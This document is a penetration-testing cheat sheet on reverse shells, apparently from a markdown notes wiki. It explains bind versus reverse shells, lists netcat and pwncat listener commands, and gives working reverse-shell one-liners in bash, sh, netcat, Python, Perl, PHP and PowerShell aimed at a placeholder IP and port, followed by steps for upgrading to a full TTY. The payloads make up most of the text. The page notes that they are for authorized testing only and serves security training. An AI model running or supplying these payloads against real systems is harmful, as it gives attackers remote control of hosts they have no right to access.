# Shells — basics

> **Generator: [https://www.revshells.com](https://www.revshells.com)** — set the listener IP and port, pick the language, copy the payload. It also has the listener command and the TTY-upgrade steps. Keep this open during an engagement; the snippets below are for when you have no browser on the box.

Authorized testing only. A reverse shell is a callback from a host you're already allowed to be on — the technique is standard post-exploitation, but the authorization is what makes it legal.

## Contents

- [Bind vs reverse](#bind-vs-reverse)
- [Start a listener](#start-a-listener)
- [Reverse shell one-liners](#reverse-shell-one-liners)
- [Upgrade to a full TTY](#upgrade-to-a-full-tty)
- [Which one to pick](#which-one-to-pick)
- [Related](#related)

## Bind vs reverse

| | Direction | Use when |
| --- | --- | --- |
| **Reverse** | Target connects **out** to you | Default. Target is behind NAT, or only outbound is allowed |
| **Bind** | You connect **in** to a port the target opens | Target has a routable IP and inbound is allowed; your box is the one behind NAT |

Reverse is the common case — set up [a listener](#start-a-listener), then run a [one-liner](#reverse-shell-one-liners) on the target pointed at your IP.

## Start a listener

```bash
nc -lvnp 4444                 # classic; -l listen -v verbose -n no-DNS -p port
rlwrap nc -lvnp 4444          # rlwrap adds arrow keys / history to the catch
pwncat-cs -lp 4444            # auto-stabilises the shell on connect — see pwncat.md
```

Full netcat reference in [netcat](netcat.md); pwncat in [pwncat](pwncat.md).

## Reverse shell one-liners

Set `IP` and `PORT` to your listener. Run **one** of these on the target.

```bash
# bash (most Linux targets)
bash -i >& /dev/tcp/IP/PORT 0>&1
# if the above is blocked, the explicit form:
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```

```bash
# POSIX sh — when bash isn't present
sh -i >& /dev/tcp/IP/PORT 0>&1
```

```bash
# netcat with -e
nc IP PORT -e /bin/sh
# netcat without -e (OpenBSD/traditional build, no -e) — mkfifo backpipe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
```

```bash
# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

```bash
# perl
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

```php
// php
php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```powershell
# PowerShell (Windows target) — one line
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sr=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()"
```

If one is blocked (no `/dev/tcp`, no `nc -e`, filtered interpreter), try the next — [revshells.com](https://www.revshells.com) has many more variants per language.

## Upgrade to a full TTY

A raw reverse shell has no job control, no tab-completion, no arrow keys, and `Ctrl-C` kills it. Upgrade it immediately:

```bash
# 1. spawn a pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
#   no python? try:  script -qc /bin/bash /dev/null

# 2. background with Ctrl-Z, then on YOUR box:
stty raw -echo; fg
#   (press Enter twice)

# 3. back in the shell, fix the terminal:
export TERM=xterm
stty rows 50 cols 200      # match your window: run `stty size` locally first
```

Now `Ctrl-C`, history and editors work. [pwncat](pwncat.md) does all of this automatically on connect.

## Which one to pick

| Situation | Reach for |
| --- | --- |
| First callback, Linux | `bash -i >& /dev/tcp/...` → then upgrade the TTY |
| `bash` missing | `sh`, then `python3`, then `perl` |
| Windows | PowerShell one-liner, or `evil-winrm` ([Remote Access](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md)) |
| You want auto-stabilise + file transfer | [pwncat](pwncat.md) |
| Just need to catch and move on | `rlwrap nc -lvnp 4444` ([netcat](netcat.md)) |
| Building a payload, have a browser | [revshells.com](https://www.revshells.com) |

## Related

[netcat](netcat.md) · [pwncat](pwncat.md) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md) · [Linux Overview](../Linux/Linux%20Overview.md) (post-exploitation loop) · [RCE](../Web/RCE.md) (where web bugs become shells) · [Metasploit](../Tools/Metasploit.md) (`multi/handler`)
